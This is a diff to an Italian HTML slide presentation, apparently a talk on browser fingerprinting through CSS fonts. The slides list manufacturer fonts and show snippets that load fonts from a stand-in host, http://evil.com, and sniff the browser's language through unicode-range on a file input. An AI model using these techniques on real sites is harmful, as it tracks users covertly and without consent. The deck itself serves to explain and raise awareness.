@@ -178,6 +178,9 @@ GET http://evil.com/spy.css HTTP/1.1
     <li>
       <p-fragment><img src="img/fingerprint.svg" role="presentation" style="height: 1em; vertical-align: middle;"> lingua</p-fragment>
     </li>
+    <li>
+      <p-fragment><img src="img/fingerprint.svg" role="presentation" style="height: 1em; vertical-align: middle;"> preferenze</p-fragment>
+    </li>
   </ul>
   <p-fragment>
     <h2 class="center" style="margin-top: 1em;">Basta?</h2>
@@ -185,8 +188,8 @@ GET http://evil.com/spy.css HTTP/1.1
 </p-slide>
 <p-slide>
   <pre class="language-css self-center big"><code>@font-face {
-  font-family: Helvetica;
-  src: local('Helvetica')</code>
+  font-family: Helvetica Neue;
+  src: local('Helvetica Neue')</code>
     <p-fragment><code>url(http://evil.com/not-apple.ttf) format('ttf');</code></p-fragment>
 }</code></pre>
 </p-slide>
@@ -216,8 +219,8 @@ GET http://evil.com/spy.css HTTP/1.1
         <td><img src="img/linux.svg" alt="Linux" style="height: 1.5em"></td>
       </tr>
       <tr>
-        <td>San Francisco Compact</td>
-        <td><img src="img/apple.svg" alt="Apple" style="height: 1.5em"> ⌚</td>
+        <td>Arimo</td>
+        <td><img src="img/chrome.svg" alt="Chrome OS" style="height: 1.5em"></td>
       </tr>
     </tbody>
   </table>
@@ -233,40 +236,31 @@ GET http://evil.com/spy.css HTTP/1.1
     <tbody>
       <tr>
         <td>Gothic Bold</td>
-        <td>Samsung</td>
+        <td><img src="img/samsung.svg" alt="Logo Samsung" style="height: 1.5em;"></td>
       </tr>
       <tr>
         <td>ChakraPetch</td>
-        <td>Xiaomi</td>
+        <td><img src="img/xiaomi.svg" alt="Logo Xiaomi" style="height: 1.5em;"></td>
       </tr>
       <tr>
         <td>OnePlus Sans</td>
-        <td>OnePlus</td>
+        <td><img src="img/oneplus.svg" alt="Logo OnePlus" style="height: 1.5em;"></td>
       </tr>
       <tr>
         <td>LG Smart</td>
-        <td>LG</td>
+        <td><img src="img/lg.svg" alt="Logo LG" style="height: 1.5em;"></td>
       </tr>
       <tr>
         <td>Furious Hello</td>
-        <td>Oppo</td>
+        <td><img src="img/oppo.svg" alt="Logo Oppo" style="height: 1.5em;"></td>
       </tr>
     </tbody>
   </table>
 </p-slide>
-<p-slide>
-  <h3 class="our-header">Ulteriore traccia: font popolari</h3>
-  <ul class="center">
-    <li><img src="img/montserrat.png" alt="Esempio di font Montserrat" style="height: 1em;"></li>
-    <li><img src="img/open-sans.png" alt="Esempio di font Open-sans" style="height: 1em;"></li>
-    <li><img src="img/lato.png" alt="Esempio di font Lato" style="height: 1em;"></li>
-    <li><img src="img/raleway.png" alt="Esempio di font Raleway" style="height: 1em;"></li>
-    <li><img src="img/oswald.png" alt="Esempio di font Oswald" style="height: 1em;"></li>
-  </ul>
-</p-slide>
 <p-slide class="center">
   <img src="img/input-type-file-fr.png" alt="input type='file' in francese" style="height: 1.5em;">
-  <img src="img/input-type-file-kr.png" alt="input type='file' in coreano" style="height: 1.5em;">
+  <img src="img/input-type-file-kr.png" alt="input type='file' in coreano" style="height: 1.5em; margin-bottom: 2em;">
+  <p-fragment class="self-center"><pre class="language-html big"><code>&lt;input type="file"></code></pre></p-fragment>
 </p-slide>
 <p-slide>
   <pre class="language-css self-center"><code>input[type="file"] { font-family: EvilSniff; }</code>
@@ -282,4 +276,25 @@ GET http://evil.com/spy.css HTTP/1.1
   unicode-range: U+c120;
 }
 ...</code></p-fragment></pre>
+  <p-fragment>
+    <div class="sketchy-arrow" style="width: 2em; top: 43%; left: 46%; transform: scale(1, -1) rotate(-30deg);"></div>
+    <span style="position: absolute; top: 41%; left: 55%;">é &rArr; 🇫🇷</span>
+  </p-fragment>
+  <p-fragment>
+    <div class="sketchy-arrow" style="width: 2em; top: 70%; left: 46%; transform: scale(1, -1) rotate(-30deg);"></div>
+    <span style="position: absolute; top: 68%; left: 55%;">선 &rArr; 🇰🇷</span>
+  </p-fragment>
+</p-slide>
+<p-slide>
+  <h3 class="our-header">Ulteriore traccia: font popolari</h3>
+  <ul class="center">
+    <li><img src="img/montserrat.png" alt="Esempio di font Montserrat" style="height: 1em;"></li>
+    <li><img src="img/open-sans.png" alt="Esempio di font Open-sans" style="height: 1em;"></li>
+    <li><img src="img/lato.png" alt="Esempio di font Lato" style="height: 1em;"></li>
+    <li><img src="img/raleway.png" alt="Esempio di font Raleway" style="height: 1em;"></li>
+    <li><img src="img/oswald.png" alt="Esempio di font Oswald" style="height: 1em;"></li>
+  </ul>
+</p-slide>
+<p-slide style="--slide-bg: #8d9091">
+  <img src="img/open-book.gif" class="full-media" alt="Come un libro aperto">
 </p-slide>
